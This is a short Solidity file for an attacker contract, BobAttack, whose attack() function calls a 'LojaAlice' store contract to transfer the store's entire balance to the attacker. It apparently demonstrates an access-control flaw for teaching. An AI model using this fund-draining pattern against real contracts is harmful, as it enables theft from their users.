// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;
contract BobAttack {
    address public owner;
    LojaAlice store;

    constructor(LojaAlice _store) {
        store = LojaAlice(_store);
        owner = msg.sender;
    }

    function attack() public {
        store.transfer(owner, address(store).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}